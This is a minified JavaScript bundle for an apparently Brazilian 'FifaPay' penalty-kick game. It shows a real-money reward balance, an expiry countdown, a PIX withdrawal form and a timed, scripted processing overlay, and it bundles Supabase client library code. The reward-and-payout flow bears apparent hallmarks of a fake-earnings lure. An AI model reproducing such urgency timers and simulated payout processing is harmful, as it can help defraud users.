            _((G) => G + 1), v(!0), Ct && g(!0);
        },
        z = (G) => {
            U(G),
                g(!1),
                m(!0),
                window.setTimeout(
                    () => {
                        m(!1), N(!0);
                    },
                    Ws.length * 1600 + 600
                );
        },
        W = `R$ ${pe !== null ? Fe(pe) : "0,00"}`,
        Pt = e;
    return j
        ? u.jsx(Cv, {
              balance: e,
              valorSaqueSelecionado: pe !== null ? pe : e,
              pixNome: (E == null ? void 0 : E.nome) ?? t,
              pixTipoChave: (E == null ? void 0 : E.tipoChave) ?? "—",
              pixChave: (E == null ? void 0 : E.chavePix) ?? "—",
          })
        : u.jsxs("div", {
              className: "min-h-dvh w-full bg-gradient-to-b from-emerald-950 via-emerald-900 to-emerald-950 text-white",
              children: [
                  u.jsxs("div", {
                      className: "mx-auto max-w-md px-5 pb-8 pt-3",
                      children: [
                          u.jsx("div", {
                              className:
                                  "mb-5 w-full overflow-hidden rounded-xl border border-yellow-400/35 bg-emerald-950/95 px-3 py-3 shadow-lg shadow-black/25",
                              children: u.jsxs("div", {
                                  className:
                                      "flex flex-col items-center justify-center gap-1.5 text-center sm:flex-row sm:flex-wrap sm:gap-x-2",
                                  children: [
                                      u.jsx("span", {
                                          className:
                                              "text-[10px] font-bold uppercase tracking-wide text-yellow-200/95 sm:text-[11px]",
                                          children: "Seu saldo expira em",
                                      }),
                                      u.jsx("span", {
                                          className:
                                              "font-mono text-base font-display font-bold tabular-nums tracking-wide text-yellow-300 sm:text-lg",
                                          children: ze,
                                      }),
                                  ],
                              }),
                          }),
                          u.jsx("div", {
                              className: "mb-5 flex justify-center",
                              children: u.jsx("img", {
                                  src: Ov,
                                  alt: "FifaPay",
                                  className:
                                      "h-12 w-auto select-none object-contain drop-shadow-[0_6px_14px_rgba(250,204,21,0.25)]",
                                  draggable: !1,
                              }),
                          }),
                          u.jsx("h1", {
                              className: "mb-1 text-center text-lg font-display font-bold text-white",
                              children: "Resgatar recompensas",
                          }),
                          u.jsxs("p", {
                              className: "mb-6 text-center text-sm text-emerald-200/80",
                              children: ["Olá, ", t],
                          }),
                          u.jsxs("div", {
                              className: "mb-4 mt-5 w-full",
                              children: [
                                  u.jsx("div", {
                                      className:
                                          "box-border w-full min-h-[117px] overflow-hidden rounded-[12px] bg-emerald-950 p-5 shadow-[0_1px_18.4px_rgba(0,0,0,0.12)]",
                                      style: {
                                          borderBottomWidth: 1,
                                          borderBottomStyle: "dashed",
                                          borderBottomColor: Pv,
                                      },
                                      children: u.jsxs("div", {
                                          className: "flex items-end justify-between gap-4",
                                          children: [
                                              u.jsxs("div", {
                                                  className: "flex min-w-0 flex-1 flex-col gap-2",
                                                  children: [
                                                      u.jsx("div", {
                                                          className: "flex items-center gap-1",
                                                          children: u.jsx("span", {
                                                              className:
                                                                  "text-[17px] font-medium leading-normal text-emerald-50",
                                                              children: "Seu saldo",
                                                          }),
                                                      }),
                                                      u.jsx("div", {
                                                          className: "flex flex-col gap-2",
                                                          "aria-live": "polite",
                                                          children: u.jsxs("span", {
                                                              className:
                                                                  "text-[30px] font-bold leading-none tracking-tight text-white",
                                                              children: ["R$ ", Fe(i)],
                                                          }),
                                                      }),
                                                  ],
                                              }),
                                              u.jsx("div", {
                                                  className: "flex shrink-0 items-end",
                                                  children: u.jsx("span", {
                                                      className: "inline-flex items-end",
                                                      children: u.jsx("img", {
                                                          src: "/resgate/p-saldo-maior.png",
                                                          alt: "",
                                                          className:
                                                              "h-[72px] w-[72px] max-h-[72px] object-contain object-bottom",
                                                          draggable: !1,
                                                      }),
                                                  }),
                                              }),
                                          ],
                                      }),
                                  }),
                                  u.jsx("div", { className: "linha h-0 w-full overflow-hidden", "aria-hidden": !0 }),
                                  u.jsx("div", {
                                      className:
                                          "box-border flex w-full flex-col items-start gap-2.5 overflow-hidden rounded-[10px] bg-emerald-950 px-5 py-2.5 shadow-[0_1px_18.4px_rgba(0,0,0,0.12)]",
                                      children: u.jsx("div", {
                                          className: "flex w-full flex-col gap-2",
                                          "aria-live": "polite",
                                          children: u.jsxs("span", {
                                              className: "text-[13px] font-normal leading-normal text-emerald-500/90",
                                              children: [
                                                  "Última recompensa:",
                                                  " ",
                                                  u.jsxs("span", {
                                                      className: "font-medium text-yellow-400/95",
                                                      children: ["R$ ", Fe(Pt)],
                                                  }),
                                              ],
                                          }),
                                      }),
                                  }),
                              ],
                          }),
                          u.jsx("div", {
                              className:
                                  "mb-4 rounded-2xl border border-emerald-700/45 bg-emerald-900/55 px-4 py-3 backdrop-blur-sm",
                              children: u.jsxs("p", {
                                  className: "text-xs font-medium text-emerald-200/85",
                                  children: [
                                      "Média por gol:",
                                      " ",
                                      n > 0
                                          ? u.jsxs("span", {
                                                className: "font-bold text-yellow-300",
                                                children: ["R$ ", Fe(I)],
                                            })
                                          : u.jsx("span", { className: "text-emerald-500/80", children: "—" }),
                                  ],
                              }),
                          }),
                          u.jsxs("div", {
                              className:
                                  "rounded-2xl border border-emerald-700/40 bg-emerald-900/50 p-5 shadow-inner backdrop-blur-sm",
                              children: [
                                  u.jsx("p", {
                                      className: "mb-1 text-base font-display font-bold text-white",
                                      children: "Sacar dinheiro",
                                  }),
                                  u.jsxs("p", {
                                      className:
                                          "mb-5 flex flex-wrap items-center gap-1.5 text-xs font-medium text-emerald-200/70",
                                      children: [
                                          u.jsx("img", {
                                              src: "/resgate/fi-rs-credit-card.png",
                                              alt: "",
                                              className: "h-4 w-4 object-contain opacity-90",
                                          }),
                                          "Transferência via /",
                                          u.jsx("img", {
                                              src: "/resgate/pix-logo.svg",
                                              alt: "PIX",
                                              className: "ml-0.5 h-[14px] w-auto opacity-90 brightness-0 invert",
                                          }),
                                      ],
                                  }),
                                  e < sn &&
                                      u.jsxs("p", {
                                          className:
                                              "mb-4 rounded-xl border border-amber-400/30 bg-amber-500/10 px-3 py-2 text-xs font-bold text-amber-300/95",
                                          children: ["Saldo abaixo do mínimo para saque (R$ ", Fe(sn), ")."],
                                      }),
                                  u.jsxs("label", {
                                      className: "mb-1.5 block text-xs font-bold text-emerald-200/90",
                                      children: ["Valor do saque (máx. R$ ", Fe(e), ")"],
                                  }),
                                  u.jsxs("div", {
                                      className: "relative mb-3",
                                      children: [
                                          u.jsx("span", {
                                              className:
                                                  "absolute left-3 top-1/2 -translate-y-1/2 text-sm font-bold text-emerald-300/80",
                                              children: "R$",
                                          }),
                                          u.jsx("input", {
                                              type: "text",
                                              inputMode: "decimal",
                                              autoComplete: "off",
                                              placeholder: "0,00",
                                              value: d,
                                              onChange: (G) => T(G.target.value),
                                              onBlur: () => v(!0),
                                              className:
                                                  "w-full rounded-xl border border-emerald-700/60 bg-emerald-950/70 py-3 pl-10 pr-3 font-bold text-white placeholder:text-emerald-600/50 focus:border-yellow-400/50 focus:outline-none focus:ring-2 focus:ring-yellow-400/40",
                                          }),
                                      ],
                                  }),
                                  u.jsxs("button", {
                                      type: "button",
                                      onClick: C,
                                      className:
                                          "mb-3 flex h-[50px] w-full items-center justify-center rounded-[6px] border-[1.5px] border-transparent bg-emerald-950/65 text-sm font-display font-bold text-emerald-100 transition-colors hover:border-emerald-600/50",
                                      children: ["Valor total: R$ ", Fe(e)],
                                  }),
                                  u.jsx("div", {
                                      className: "min-h-[18px]",
                                      children:
                                          ot &&
                                          u.jsx("p", {
                                              className: "text-[11px] font-medium text-red-400",
                                              children: pt,
                                          }),
                                  }),
                                  u.jsxs("button", {
                                      type: "button",
                                      onClick: R,
                                      className: `mt-2 flex h-12 w-full items-center justify-center gap-2 rounded-2xl text-sm font-display font-bold transition-all ${Ct && e >= sn ? "bg-gradient-to-r from-yellow-400 to-amber-400 text-emerald-950 shadow-lg shadow-yellow-500/25 hover:from-yellow-300 hover:to-amber-300 active:scale-[0.98]" : "cursor-not-allowed border border-emerald-800 bg-emerald-950/80 text-emerald-600"}`,
                                      disabled: e < sn,
                                      children: [
                                          u.jsx(uu, { className: "h-5 w-5", strokeWidth: 2.5 }),
                                          "Sacar dinheiro",
                                      ],
                                  }),
                              ],
                          }),
                          u.jsx("button", {
                              type: "button",
                              onClick: s,
                              className:
                                  "mt-6 w-full rounded-2xl border-2 border-emerald-600/50 bg-emerald-900/30 py-3.5 text-sm font-bold text-emerald-100 transition-all hover:bg-emerald-900/50 active:scale-[0.99]",
                              children: "Jogar novamente",
                          }),
                      ],
                  }),
                  u.jsx(bv, { open: b, valorFormatado: W, onClose: () => g(!1), onSubmit: z }),
                  p &&
                      u.jsxs("div", {
                          className:
                              "fixed inset-0 z-[250] flex flex-col items-center justify-center bg-emerald-950/95 px-8",
                          children: [
                              u.jsx("div", {
                                  className: "mb-8 h-2 w-full max-w-xs overflow-hidden rounded-full bg-emerald-900",
                                  children: u.jsx("div", {
                                      className:
                                          "h-full rounded-full bg-gradient-to-r from-yellow-400 to-amber-400 transition-all duration-500 ease-out",
                                      style: { width: `${((w + 1) / Ws.length) * 100}%` },
                                  }),
                              }),
                              u.jsx("p", { className: "text-center text-base font-bold text-white", children: Ws[w] }),
                          ],
                      }),
              ],
          });
}
function Iv() {
    return u.jsxs("div", {
        className: "absolute inset-0 pointer-events-none overflow-hidden",
        children: [
            u.jsx("div", {
                className: "absolute inset-x-0 top-0 h-[26%]",
                style: {
                    background:
                        "linear-gradient(180deg, #0a0f1a 0%, #0f172a 22%, #1e293b 48%, #334155 78%, #3d4f63 100%)",
                },
            }),
            u.jsxs("div", {
                className: "absolute inset-x-0 top-0 h-[26%] overflow-hidden",
                style: { filter: "saturate(0.72) brightness(0.8)" },
                children: [
                    u.jsx("img", {
                        src: "/Design_sem_nome_(9)_(1).png",
                        alt: "Crowd",
                        className: "absolute inset-0 h-full w-full select-none object-cover object-top",
                        draggable: !1,
                        loading: "eager",
                        decoding: "async",
                    }),
                    u.jsx("div", {
                        className: "absolute inset-x-0 bottom-0 h-[45%]",
                        style: {
                            background:
                                "linear-gradient(180deg, rgba(15,23,42,0) 0%, rgba(15,23,42,0.45) 55%, rgba(15,23,42,0.68) 100%)",
                        },
                    }),
                ],
            }),
            u.jsx("div", {
                className:
                    "absolute inset-x-0 top-[24.5%] h-[2%] min-h-[8px] bg-gradient-to-b from-slate-900 via-slate-800 to-slate-900 shadow-md sm:top-[25%]",
            }),
        ],
    });
}
const Av = "/goleiro.png",
    Lv = "/ChatGPT_Image_18_de_abr._de_2026__16_03_02-removebg-preview.png";
function Mv({ diving: t, direction: e }) {
    const n = t ? (e === "left" ? -42 : e === "right" ? 42 : 0) : 0,
        r = 0,
        s = t && e !== "center" ? -2 : t ? -6 : 0,
        i = t && e === "center" ? 1.08 : 1,
        o = t ? Lv : Av;
    return u.jsxs("div", {
        className: "relative w-full h-full",
        style: { filter: "drop-shadow(0 10px 14px rgba(0,0,0,0.55))" },
        children: [
            u.jsx("style", {
                children: `
        @keyframes keeperIdleBob {
          0%, 100% { transform: translate(-50%, 0) scale(1); }
          50% { transform: translate(-50%, -3px) scale(1.008); }
        }
      `,
            }),
            u.jsx("div", {
                style: {
                    position: "absolute",
                    bottom: 0,
                    left: "50%",
                    height: "100%",
                    aspectRatio: "400 / 600",
                    transform: `translate(-50%, ${s}px) translateX(${r}px) rotate(${n}deg) scale(${i})`,
                    transformOrigin: "center bottom",
                    transition: "transform 480ms cubic-bezier(0.4, 0, 0.2, 1)",
                    animation: t ? "none" : "keeperIdleBob 2.8s ease-in-out infinite",
                },
                children: u.jsx("img", {
                    src: o,
                    alt: "Goalkeeper",
                    draggable: !1,
                    style: {
                        width: "100%",
                        height: "100%",
                        objectFit: "contain",
                        objectPosition: "bottom center",
                        display: "block",
                        userSelect: "none",
                    },
                }),
            }),
        ],
    });
}
const Uv = "/ChatGPT_Image_18_de_abr._de_2026__14_29_57-removebg-preview.png";
function Dv({ phase: t, kickDirection: e }) {
    const n = t === "kick",
        r = t === "followthrough",
        s = t === "runup",
        i = t === "idle",
        o = e === "left" ? -1 : e === "right" ? 1 : 0,
        a = s ? -3 : n ? 6 + o * 2 : r ? 3 + o : 0,
        l = s ? -2 : n ? -6 : r ? -3 : 0,
        c = n ? 1.03 : r ? 1.01 : 1;
    return u.jsxs("div", {
        className: "relative w-full h-full",
        style: { filter: "drop-shadow(0 14px 20px rgba(0,0,0,0.6))" },
        children: [
            u.jsx("style", {
                children: `
        @keyframes playerIdleBob {
          0%, 100% { transform: translateX(-50%) translateY(0px) scale(1); }
          50% { transform: translateX(-50%) translateY(-3px) scale(1.005); }
        }
      `,
            }),
            u.jsx("div", {
                style: {
                    position: "absolute",
                    bottom: 0,
                    left: "50%",
                    transform: `translateX(-50%) translateY(${l}px) rotate(${a}deg) scale(${c})`,
                    transformOrigin: "center bottom",
                    transition: "transform 420ms cubic-bezier(0.25, 0.46, 0.45, 0.94)",
                    height: "100%",
                    aspectRatio: "400 / 600",
                    animation: i ? "playerIdleBob 2.4s ease-in-out infinite" : "none",
                },
                children: u.jsx("img", {
                    src: Uv,
                    alt: "Player",
                    draggable: !1,
                    style: {
                        width: "100%",
                        height: "100%",
                        objectFit: "contain",
                        objectPosition: "bottom center",
                        display: "block",
                        userSelect: "none",
                    },
                }),
            }),
        ],
    });
}
const zv = "/pngegg_(1).png";
function Uc({ spinning: t }) {
    return u.jsxs("div", {
        style: {
            width: "100%",
            height: "100%",
            filter: "drop-shadow(0 6px 8px rgba(0,0,0,0.55))",
            animation: t ? "ballSpin 0.45s linear infinite" : "ballIdleBob 2.2s ease-in-out infinite",
        },
        children: [
            u.jsx("style", {
                children: `
        @keyframes ballSpin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
        @keyframes ballIdleBob {
          0%, 100% { transform: translateY(0) rotate(-2deg) scale(1); }
          50% { transform: translateY(-2%) rotate(2deg) scale(1.01); }
        }
      `,
            }),
            u.jsx("img", {
                src: zv,
                alt: "Ball",
                draggable: !1,
                style: { width: "100%", height: "100%", objectFit: "contain", display: "block", userSelect: "none" },
            }),
        ],
    });
}
function Fv() {
    return u.jsxs("svg", {
        viewBox: "0 0 200 130",
        className: "w-full h-full absolute inset-0",
        preserveAspectRatio: "none",
        style: { zIndex: 1 },
        children: [
            u.jsxs("defs", {
                children: [
                    u.jsxs("linearGradient", {
                        id: "postMetal",
                        x1: "0",
                        x2: "1",
                        y1: "0",
                        y2: "0",
                        children: [
                            u.jsx("stop", { offset: "0%", stopColor: "#94a3b8" }),
                            u.jsx("stop", { offset: "25%", stopColor: "#f1f5f9" }),
                            u.jsx("stop", { offset: "50%", stopColor: "#ffffff" }),
                            u.jsx("stop", { offset: "75%", stopColor: "#e2e8f0" }),
                            u.jsx("stop", { offset: "100%", stopColor: "#64748b" }),
                        ],
                    }),
                    u.jsxs("linearGradient", {
                        id: "crossbarMetal",
                        x1: "0",
                        x2: "0",
                        y1: "0",
                        y2: "1",
                        children: [
                            u.jsx("stop", { offset: "0%", stopColor: "#ffffff" }),
                            u.jsx("stop", { offset: "50%", stopColor: "#f1f5f9" }),
                            u.jsx("stop", { offset: "100%", stopColor: "#64748b" }),
                        ],
                    }),
                    u.jsx("pattern", {
                        id: "netGame",
                        x: "0",
                        y: "0",
                        width: "4",
                        height: "3.5",
                        patternUnits: "userSpaceOnUse",
                        children: u.jsx("path", {
                            d: "M 0 0 L 4 3.5 M 4 0 L 0 3.5",
                            stroke: "rgba(255,255,255,0.7)",
                            strokeWidth: "0.3",
                        }),
                    }),
                    u.jsxs("linearGradient", {
                        id: "netBg",
                        x1: "0",
                        x2: "0",
                        y1: "0",
                        y2: "1",
                        children: [
                            u.jsx("stop", { offset: "0%", stopColor: "rgba(15,23,42,0.35)" }),
                            u.jsx("stop", { offset: "100%", stopColor: "rgba(15,23,42,0.6)" }),
                        ],
                    }),
                ],
            }),
            u.jsx("rect", { x: "18", y: "20", width: "164", height: "90", fill: "url(#netBg)" }),
            u.jsx("rect", { x: "18", y: "20", width: "164", height: "90", fill: "url(#netGame)" }),
            u.jsx("line", {
                x1: "18",
                y1: "20",
                x2: "12",
                y2: "115",
                stroke: "rgba(255,255,255,0.35)",
                strokeWidth: "0.5",
            }),
            u.jsx("line", {
                x1: "182",
                y1: "20",
                x2: "188",
                y2: "115",
                stroke: "rgba(255,255,255,0.35)",
                strokeWidth: "0.5",
            }),
            u.jsx("rect", { x: "15", y: "18", width: "6", height: "98", fill: "url(#postMetal)", rx: "1" }),
            u.jsx("rect", { x: "179", y: "18", width: "6", height: "98", fill: "url(#postMetal)", rx: "1" }),
            u.jsx("rect", { x: "12", y: "17", width: "176", height: "6", fill: "url(#crossbarMetal)", rx: "1" }),
            u.jsx("rect", { x: "14", y: "113", width: "8", height: "4", fill: "url(#postMetal)" }),
            u.jsx("rect", { x: "178", y: "113", width: "8", height: "4", fill: "url(#postMetal)" }),
            u.jsx("ellipse", { cx: "18", cy: "118", rx: "4", ry: "1.5", fill: "rgba(0,0,0,0.4)" }),
            u.jsx("ellipse", { cx: "182", cy: "118", rx: "4", ry: "1.5", fill: "rgba(0,0,0,0.4)" }),
        ],
    });
}
const Bv = "/grass-field-bg.png";
function Vv() {
    return u.jsxs("div", {
        className: "pointer-events-none absolute inset-x-0 bottom-0 top-[26%] z-[1] overflow-hidden bg-[#0f2818]",
        "aria-hidden": !0,
        children: [
            u.jsx("img", {
                src: Bv,
                alt: "",
                draggable: !1,
                className: "absolute inset-0 h-full w-full select-none object-cover object-center",
                style: { filter: "saturate(1.06) contrast(1.03)" },
            }),
            u.jsx("div", {
                className: "pointer-events-none absolute inset-0",
                style: {
                    background: `
            linear-gradient(180deg, rgba(5, 20, 12, 0.4) 0%, transparent 32%),
            linear-gradient(0deg, rgba(0, 0, 0, 0.18) 0%, transparent 22%)
          `,
                },
            }),
        ],
    });
}
function Wv() {
    const t = x.useId().replace(/:/g, ""),
        e = 6,
        n = 47,
        r = n - e,
        s = (w) => e + (w / 16.5) * r,
        i = s(5.5),
        o = s(11),
        a = 18.32 / 40.32,
        l = 20.5,
        c = l * a,
        d = 34,
        f =
            ((w) => {
                const k = (w - e) / r;
                return l + k * (d - l);
            })(i) * a,
        v = 50,
        y = 40.32 / 2,
        b = (Math.sqrt(9.15 * 9.15 - 5.5 * 5.5) / y) * d,
        p = ((9.15 - 5.5) / 16.5) * r,
        m = n + p;
    return u.jsx("div", {
        className: "absolute bottom-0 left-0 right-0 z-[3] h-[56%] overflow-hidden pointer-events-none",
        style: { perspective: "1100px" },
        children: u.jsxs("div", {
            className: "absolute left-1/2 bottom-0 h-full w-[260%] max-w-[260vw] -translate-x-1/2",
            style: { transform: "rotateX(56deg)", transformOrigin: "bottom center", backfaceVisibility: "hidden" },
            children: [
                u.jsxs("svg", {
                    className: "absolute inset-0 h-full w-full",
                    viewBox: "0 0 100 72",
                    preserveAspectRatio: "xMidYMax meet",
                    "aria-hidden": !0,
                    children: [
                        u.jsx("defs", {
                            children: u.jsxs("filter", {
                                id: t,
                                x: "-20%",
                                y: "-20%",
                                width: "140%",
                                height: "140%",
                                children: [
                                    u.jsx("feGaussianBlur", { in: "SourceGraphic", stdDeviation: "0.15", result: "b" }),
                                    u.jsxs("feMerge", {
                                        children: [
                                            u.jsx("feMergeNode", { in: "b" }),
                                            u.jsx("feMergeNode", { in: "SourceGraphic" }),
                                        ],
                                    }),
                                ],
                            }),
                        }),
                        u.jsx("line", {
                            x1: "6",
                            y1: e,
                            x2: "94",
                            y2: e,
                            stroke: "rgba(255,255,255,0.88)",
                            strokeWidth: "0.42",
                            strokeLinecap: "square",
                            filter: `url(#${t})`,
                        }),
                        u.jsx("path", {
                            d: `M ${v - l} ${e} L ${v + l} ${e} L ${v + d} ${n} L ${v - d} ${n} Z`,
                            fill: "none",
                            stroke: "rgba(255,255,255,0.92)",
                            strokeWidth: "0.4",
                            strokeLinejoin: "miter",
                            filter: `url(#${t})`,
                        }),
                        u.jsx("path", {
                            d: `M ${v - c} ${e} L ${v + c} ${e} L ${v + f} ${i} L ${v - f} ${i} Z`,
                            fill: "none",
                            stroke: "rgba(255,255,255,0.84)",
                            strokeWidth: "0.36",
                            strokeLinejoin: "miter",
                            filter: `url(#${t})`,
                        }),
                        u.jsx("circle", {
                            cx: v,
                            cy: o,
                            r: "1.08",
                            fill: "rgba(255,255,255,0.96)",
                            stroke: "rgba(255,255,255,0.45)",
                            strokeWidth: "0.1",
                            filter: `url(#${t})`,
                        }),
                        u.jsx("path", {
                            d: `M ${v - b} ${n} Q ${v} ${m.toFixed(2)} ${v + b} ${n}`,
                            fill: "none",
                            stroke: "rgba(255,255,255,0.8)",
                            strokeWidth: "0.36",
                            strokeLinecap: "round",
                            filter: `url(#${t})`,
                        }),
                    ],
                }),
                u.jsx("div", {
                    className: "pointer-events-none absolute inset-0",
                    style: {
                        background:
                            "linear-gradient(180deg, rgba(255,255,255,0.04) 0%, transparent 35%, rgba(0,0,0,0.06) 100%)",
                    },
                }),
            ],
        }),
    });
}
const Hv = "/sponsor-hoardings.png";
function qv() {
    return u.jsx("div", {
        className:
            "pointer-events-none absolute inset-x-0 top-[27%] z-[6] h-[52px] w-full -translate-y-1/2 overflow-hidden shadow-[0_10px_28px_rgba(0,0,0,0.65)] ring-1 ring-black/35 sm:h-[62px]",
        style: {
            backgroundImage: `url(${Hv})`,
            backgroundRepeat: "repeat-x",
            backgroundSize: "auto 100%",
            backgroundPosition: "left center",
        },
        "aria-hidden": !0,
    });
}
const Gv = "modulepreload",
    Kv = function (t) {
        return "/" + t;
    },
    Dc = {},
    bs = function (e, n, r) {
        let s = Promise.resolve();
        if (n && n.length > 0) {
            document.getElementsByTagName("link");
            const o = document.querySelector("meta[property=csp-nonce]"),
                a = (o == null ? void 0 : o.nonce) || (o == null ? void 0 : o.getAttribute("nonce"));
            s = Promise.allSettled(
                n.map((l) => {
                    if (((l = Kv(l)), l in Dc)) return;
                    Dc[l] = !0;
                    const c = l.endsWith(".css"),
                        d = c ? '[rel="stylesheet"]' : "";
                    if (document.querySelector(`link[href="${l}"]${d}`)) return;
                    const h = document.createElement("link");
                    if (
                        ((h.rel = c ? "stylesheet" : Gv),
                        c || (h.as = "script"),
                        (h.crossOrigin = ""),
                        (h.href = l),
                        a && h.setAttribute("nonce", a),
                        document.head.appendChild(h),
                        c)
                    )
                        return new Promise((f, v) => {
                            h.addEventListener("load", f),
                                h.addEventListener("error", () => v(new Error(`Unable to preload CSS for ${l}`)));
                        });
                })
            );
        }
        function i(o) {
            const a = new Event("vite:preloadError", { cancelable: !0 });
            if (((a.payload = o), window.dispatchEvent(a), !a.defaultPrevented)) throw o;
        }
        return s.then((o) => {
            for (const a of o || []) a.status === "rejected" && i(a.reason);
            return e().catch(i);
        });
    },
    Qv = (t) => {
        let e;
        return (
            t
                ? (e = t)
                : typeof fetch > "u"
                  ? (e = (...n) =>
                        bs(
                            async () => {
                                const { default: r } = await Promise.resolve().then(() => gr);
                                return { default: r };
                            },
                            void 0
                        ).then(({ default: r }) => r(...n)))
                  : (e = fetch),
            (...n) => e(...n)
        );
    };
class cu extends Error {
    constructor(e, n = "FunctionsError", r) {
        super(e), (this.name = n), (this.context = r);
    }
}
class Jv extends cu {
    constructor(e) {
        super("Failed to send a request to the Edge Function", "FunctionsFetchError", e);
    }
}
class zc extends cu {
    constructor(e) {
        super("Relay Error invoking the Edge Function", "FunctionsRelayError", e);
    }
}
class Fc extends cu {
    constructor(e) {
        super("Edge Function returned a non-2xx status code", "FunctionsHttpError", e);
    }
}
var Ya;
(function (t) {
    (t.Any = "any"),
        (t.ApNortheast1 = "ap-northeast-1"),
        (t.ApNortheast2 = "ap-northeast-2"),
        (t.ApSouth1 = "ap-south-1"),
        (t.ApSoutheast1 = "ap-southeast-1"),
        (t.ApSoutheast2 = "ap-southeast-2"),
        (t.CaCentral1 = "ca-central-1"),
        (t.EuCentral1 = "eu-central-1"),
        (t.EuWest1 = "eu-west-1"),
        (t.EuWest2 = "eu-west-2"),
        (t.EuWest3 = "eu-west-3"),
        (t.SaEast1 = "sa-east-1"),
        (t.UsEast1 = "us-east-1"),
        (t.UsWest1 = "us-west-1"),
        (t.UsWest2 = "us-west-2");
})(Ya || (Ya = {}));
var Xv = function (t, e, n, r) {
    function s(i) {
        return i instanceof n
            ? i
            : new n(function (o) {
                  o(i);
              });
    }
    return new (n || (n = Promise))(function (i, o) {
        function a(d) {
            try {
                c(r.next(d));
            } catch (h) {
                o(h);
            }
        }
        function l(d) {
            try {
                c(r.throw(d));
            } catch (h) {
                o(h);
            }
        }
        function c(d) {
            d.done ? i(d.value) : s(d.value).then(a, l);
        }
        c((r = r.apply(t, e || [])).next());
    });
};
class Yv {
    constructor(e, { headers: n = {}, customFetch: r, region: s = Ya.Any } = {}) {
        (this.url = e), (this.headers = n), (this.region = s), (this.fetch = Qv(r));
    }
    setAuth(e) {
        this.headers.Authorization = `Bearer ${e}`;
    }
    invoke(e, n = {}) {
        var r;
        return Xv(this, void 0, void 0, function* () {
            try {
                const { headers: s, method: i, body: o } = n;
                let a = {},
                    { region: l } = n;
                l || (l = this.region);
                const c = new URL(`${this.url}/${e}`);
                l && l !== "any" && ((a["x-region"] = l), c.searchParams.set("forceFunctionRegion", l));
                let d;
                o &&
                    ((s && !Object.prototype.hasOwnProperty.call(s, "Content-Type")) || !s) &&
                    ((typeof Blob < "u" && o instanceof Blob) || o instanceof ArrayBuffer
                        ? ((a["Content-Type"] = "application/octet-stream"), (d = o))
                        : typeof o == "string"
                          ? ((a["Content-Type"] = "text/plain"), (d = o))
                          : typeof FormData < "u" && o instanceof FormData
                            ? (d = o)
                            : ((a["Content-Type"] = "application/json"), (d = JSON.stringify(o))));
                const h = yield this.fetch(c.toString(), {
                        method: i || "POST",
                        headers: Object.assign(Object.assign(Object.assign({}, a), this.headers), s),
                        body: d,
                    }).catch((_) => {
                        throw new Jv(_);
                    }),
                    f = h.headers.get("x-relay-error");
                if (f && f === "true") throw new zc(h);
                if (!h.ok) throw new Fc(h);
                let v = ((r = h.headers.get("Content-Type")) !== null && r !== void 0 ? r : "text/plain")
                        .split(";")[0]
                        .trim(),
                    y;
                return (
                    v === "application/json"
                        ? (y = yield h.json())
                        : v === "application/octet-stream"
                          ? (y = yield h.blob())
                          : v === "text/event-stream"
                            ? (y = h)
                            : v === "multipart/form-data"
                              ? (y = yield h.formData())
                              : (y = yield h.text()),
                    { data: y, error: null, response: h }
                );
            } catch (s) {
                return { data: null, error: s, response: s instanceof Fc || s instanceof zc ? s.context : void 0 };
            }
        });
    }
}
var Ce = {},
    du = {},
    ro = {},
    ks = {},
    so = {},
    io = {},
    Zv = function () {
        if (typeof self < "u") return self;
        if (typeof window < "u") return window;
        if (typeof global < "u") return global;
        throw new Error("unable to locate global object");
    },
    dr = Zv();
const ey = dr.fetch,
    $f = dr.fetch.bind(dr),
    If = dr.Headers,
    ty = dr.Request,
    ny = dr.Response,
    gr = Object.freeze(
        Object.defineProperty(
            { __proto__: null, Headers: If, Request: ty, Response: ny, default: $f, fetch: ey },
            Symbol.toStringTag,
            { value: "Module" }
        )
    ),
    ry = gp(gr);
var oo = {};
Object.defineProperty(oo, "__esModule", { value: !0 });
let sy = class extends Error {
    constructor(e) {
        super(e.message),
            (this.name = "PostgrestError"),
            (this.details = e.details),
            (this.hint = e.hint),
            (this.code = e.code);
    }
};
oo.default = sy;
var Af =
    (Ge && Ge.__importDefault) ||
    function (t) {
        return t && t.__esModule ? t : { default: t };
    };
Object.defineProperty(io, "__esModule", { value: !0 });
const iy = Af(ry),
    oy = Af(oo);
let ay = class {
    constructor(e) {
        var n, r;
        (this.shouldThrowOnError = !1),
            (this.method = e.method),
            (this.url = e.url),
            (this.headers = new Headers(e.headers)),
            (this.schema = e.schema),
            (this.body = e.body),
            (this.shouldThrowOnError = (n = e.shouldThrowOnError) !== null && n !== void 0 ? n : !1),
            (this.signal = e.signal),
            (this.isMaybeSingle = (r = e.isMaybeSingle) !== null && r !== void 0 ? r : !1),
            e.fetch ? (this.fetch = e.fetch) : typeof fetch > "u" ? (this.fetch = iy.default) : (this.fetch = fetch);
    }
    throwOnError() {
        return (this.shouldThrowOnError = !0), this;
    }
    setHeader(e, n) {
        return (this.headers = new Headers(this.headers)), this.headers.set(e, n), this;
    }
    then(e, n) {
        this.schema === void 0 ||
            (["GET", "HEAD"].includes(this.method)
                ? this.headers.set("Accept-Profile", this.schema)
                : this.headers.set("Content-Profile", this.schema)),
            this.method !== "GET" && this.method !== "HEAD" && this.headers.set("Content-Type", "application/json");
        const r = this.fetch;
        let s = r(this.url.toString(), {
            method: this.method,
            headers: this.headers,
            body: JSON.stringify(this.body),
            signal: this.signal,
        }).then(async (i) => {
            var o, a, l, c;
            let d = null,
                h = null,
                f = null,
                v = i.status,
                y = i.statusText;
            if (i.ok) {
                if (this.method !== "HEAD") {
                    const p = await i.text();
                    p === "" ||
                        (this.headers.get("Accept") === "text/csv" ||
                        (this.headers.get("Accept") &&
                            !((o = this.headers.get("Accept")) === null || o === void 0) &&
                            o.includes("application/vnd.pgrst.plan+text"))
                            ? (h = p)
                            : (h = JSON.parse(p)));
                }
                const b =
                        (a = this.headers.get("Prefer")) === null || a === void 0
                            ? void 0
                            : a.match(/count=(exact|planned|estimated)/),
                    g = (l = i.headers.get("content-range")) === null || l === void 0 ? void 0 : l.split("/");
                b && g && g.length > 1 && (f = parseInt(g[1])),
                    this.isMaybeSingle &&
                        this.method === "GET" &&
                        Array.isArray(h) &&
                        (h.length > 1
                            ? ((d = {
                                  code: "PGRST116",
                                  details: `Results contain ${h.length} rows, application/vnd.pgrst.object+json requires 1 row`,
                                  hint: null,
                                  message: "JSON object requested, multiple (or no) rows returned",
                              }),
                              (h = null),
                              (f = null),
                              (v = 406),
                              (y = "Not Acceptable"))
                            : h.length === 1
                              ? (h = h[0])
                              : (h = null));
            } else {
                const b = await i.text();
                try {
